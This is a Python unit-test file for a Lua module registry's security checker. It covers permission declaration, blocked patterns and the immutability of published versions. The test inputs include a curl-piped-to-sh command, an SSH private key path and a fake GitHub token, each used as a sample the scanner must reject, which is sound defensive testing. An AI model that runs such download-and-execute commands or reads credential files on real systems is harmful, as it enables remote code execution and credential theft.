#!/usr/bin/env python3
"""Unit tests for the registry's conservative static policy."""

import importlib.util
import json
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("gg_module_checker", ROOT / "scripts" / "check-modules.py")
CHECKER = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
SPEC.loader.exec_module(CHECKER)


class ModuleSecurityTests(unittest.TestCase):
    def scan(self, source, permissions=()):
        item = {"name": "test-package", "permissions": list(permissions)}
        CHECKER.scan_source(item, ROOT / "modules" / "test-package" / "1.0.0.lua", source)

    def test_safe_module_needs_no_capabilities(self):
        self.scan('local M = {}\nfunction M.run(ctx) ctx.log("ok") end\nreturn M\n')

    def test_process_api_must_be_declared(self):
        source = 'local M = {}\nfunction M.run(ctx) return ctx.run({argv={"true"}}) end\nreturn M\n'
        with self.assertRaisesRegex(ValueError, "requires declared permission.*process"):
            self.scan(source)
        self.scan(source, ("process",))

    def test_dynamic_loader_is_blocked_even_if_declared(self):
        with self.assertRaisesRegex(ValueError, "dynamic Lua loader"):
            self.scan('local M={}\nload("return 1")\nreturn M\n', ("process",))

    def test_shell_download_pipe_is_blocked(self):
        with self.assertRaisesRegex(ValueError, "download piped directly"):
            self.scan('os.execute("curl https://example.invalid/x | sh")', ("process",))

    def test_credential_paths_are_blocked(self):
        with self.assertRaisesRegex(ValueError, "credential/browser-wallet"):
            self.scan('local path = "~/.ssh/id_ed25519"')

    def test_hard_coded_github_tokens_are_blocked(self):
        with self.assertRaisesRegex(ValueError, "hard-coded secret"):
            self.scan('local token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef"')

    def test_unused_capabilities_are_blocked(self):
        with self.assertRaisesRegex(ValueError, "unused permission"):
            self.scan('local M={} return M', ("network",))

    @staticmethod
    def git(*args, cwd):
        subprocess.run(["git", *args], cwd=cwd, check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def make_base_repo(self, catalog, files=None):
        temp = tempfile.TemporaryDirectory(prefix="gg-registry-base-")
        root = Path(temp.name)
        self.git("init", "-q", cwd=root)
        self.git("config", "user.email", "ci@example.invalid", cwd=root)
        self.git("config", "user.name", "CI", cwd=root)
        index = root / "modules" / "index.json"
        index.parent.mkdir(parents=True)
        index.write_text(json.dumps(catalog), encoding="utf-8")
        for name, body in (files or {}).items():
            target = root / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(body, encoding="utf-8")
        self.git("add", "modules", cwd=root)
        self.git("commit", "-m", "base catalog", cwd=root)
        return temp, root

    @staticmethod
    def base_entry(version="1.0.0"):
        return {
            "name": "demo", "version": version,
            "description": "Demo package", "file": f"modules/demo/{version}.lua",
            "sha256": "0" * 64, "permissions": [], "license": "ISC",
        }

    def test_published_versions_are_immutable(self):
        entry = self.base_entry()
        old = {"schema": 1, "packages": [entry]}
        temp, root = self.make_base_repo(old, {entry["file"]: "return {}\n"})
        self.addCleanup(temp.cleanup)
        CHECKER.check_immutable_versions("HEAD", old, root)
        changed = {"schema": 1, "packages": [{**entry, "description": "changed"}]}
        with self.assertRaisesRegex(ValueError, "metadata is immutable"):
            CHECKER.check_immutable_versions("HEAD", changed, root)

    def test_published_versions_cannot_be_removed(self):
        entry = self.base_entry()
        old = {"schema": 1, "packages": [entry]}
        temp, root = self.make_base_repo(old, {entry["file"]: "return {}\n"})
        self.addCleanup(temp.cleanup)
        with self.assertRaisesRegex(ValueError, "cannot be removed"):
            CHECKER.check_immutable_versions("HEAD", {"schema": 1, "packages": []}, root)

    def test_new_version_must_use_a_fresh_path(self):
        old_entry = self.base_entry()
        old = {"schema": 1, "packages": [old_entry]}
        reused = self.base_entry("1.0.1")
        temp, root = self.make_base_repo(
            old, {old_entry["file"]: "return {}\n", reused["file"]: "old content\n"}
        )
        self.addCleanup(temp.cleanup)
        with self.assertRaisesRegex(ValueError, "already existed in base"):
            CHECKER.check_immutable_versions(
                "HEAD", {"schema": 1, "packages": [old_entry, reused]}, root
            )


if __name__ == "__main__":
    unittest.main(verbosity=2)
